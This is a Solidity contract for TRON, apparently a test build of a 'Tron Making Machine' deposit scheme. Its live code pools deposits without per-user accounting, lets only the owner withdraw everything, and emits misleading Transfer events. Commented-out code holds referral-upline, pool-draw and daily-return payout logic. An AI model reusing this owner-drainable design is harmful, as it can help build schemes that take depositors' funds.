//SourceUnit: Shishir-Solidity - Tested Succesfully.sol

/**
 *Submitted for verification at Tronscan.io on 2020-11-20
*/
/**
 
* Tron Making Machine 
* https://tmm.ai/
* 
**/
pragma solidity >=0.4.23 <0.6.0;

/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract test1TronMakingMachine {
 
	    
	/*==============================
    =            EVENTS            =
    ==============================*/
	event Transfer(address indexed sender,address indexed to,uint256 value);
    using SafeMath for uint256;

	/*=====================================
    =            CONFIGURABLES            =
    =====================================*/
	//Private state variable 
    address payable private owner; 
	mapping(address => uint256) internal tokenBalanceLedger_;
    mapping(address => uint256) internal etherBalanceLedger_;
	
	                
    uint256 public tmm_return;  // 1 => 1%
    uint256 public tmmprolevel_bonus;   //1-9 level
	uint256 public tmmprimelevel_bonus;  //10-12 level
    uint256 public tmmpropool_bonus;
    uint256 public tmmprimepool_bonus;
	uint256 public tmmproroyalty_bonus;
	uint256 public tmmprimeroyalty_bonus;
	/*
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
	*/
	/*=====================================
    =            CONTRUCTOR            =
    =====================================*/
	
	// Defining a constructor    
     constructor() public{    
        owner=msg.sender; 
    }
	
	function () external payable {}
	
	/*
	function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }
    */

    // Function to get address of owner 
    function getContractOwner() public view returns (address) {     
        return owner; 
    } 
    
	function contractBalance() public view returns (uint) {
		return address(this).balance;
	}
	
	function myTokens()
        public
        view
        returns(uint256)
    {
        address _customerAddress = msg.sender;
        return balanceOf(_customerAddress);
    }
    /*
	function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
                
                users[up].level_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }
    */
   
    /**
     * Retrieve the token balance of any single address.
     */
    function balanceOf(address _customerAddress)
        view
        public
        returns(uint256)
    {
        return tokenBalanceLedger_[_customerAddress];
    }
	
    
	 function singlesendTron() public payable {
		address _customerAddress = msg.sender;
		uint256 _balance = msg.value;
        uint256 _internalTxn = 0;
		if (_balance > msg.sender.balance) {revert("Amount unmatched");}
		/*owner.transfer(_internalTxn);*/
		tokenBalanceLedger_[address(this)] = SafeMath.add(tokenBalanceLedger_[address(this)],_balance);
		/** Below line is for TMM. */		
		emit Transfer(_customerAddress,owner,_balance);  
    }
	 /*
    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }
	function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 30 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }
	*/
	function WithdrawCurrency(address payable  _receiver, uint256 _withdrawAmount) public {
		address _customerAddress = msg.sender;
		uint256 _contractBalance = contractBalance();
		if (msg.sender != address(this) && msg.sender != owner) {revert("Invalid Sender Address");}
		if (_contractBalance < _withdrawAmount) {revert("Not enough amount");}
		_receiver.transfer(_withdrawAmount);
		tokenBalanceLedger_[address(this)] = SafeMath.sub(tokenBalanceLedger_[address(this)],_withdrawAmount);
		/** Below line is for TMM. */		
		emit Transfer(address(this),_receiver,_withdrawAmount);  
    }
	/*
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 level_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].level_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
	*/
}